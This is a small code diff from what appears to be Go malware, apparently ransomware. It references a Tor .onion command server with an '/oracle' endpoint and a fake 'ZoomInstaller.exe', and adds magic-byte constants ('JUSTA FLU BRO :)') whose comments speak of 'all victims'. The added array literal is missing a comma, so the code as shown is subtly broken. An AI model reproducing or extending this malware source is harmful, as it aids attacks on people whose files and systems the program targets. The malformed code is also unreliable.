@@ -18,11 +18,17 @@ var (
 
     torDirectory  = workDir + `\Tor`
     zoomInstaller = workDir + `\ZoomInstaller.exe`
+
+    // cast magicBytes to array lol, very safe indeed
+    // all victims will be on little endian systems anyway
+    magicNumbers = [2]uint64{5496115860211979594 2970722429258834005}
 )
 
 const (
     hiddenServiceBase   = "http://v6au4j6rkvve6s2b4mbv6cvhc3oqswqfvzdjv2exyefsiyxrur5bktyd.onion"
     hiddenServiceOracle = hiddenServiceBase + "/oracle"
+
+    magicBytes = "JUSTA FLU BRO :)"
 )
 
 var (
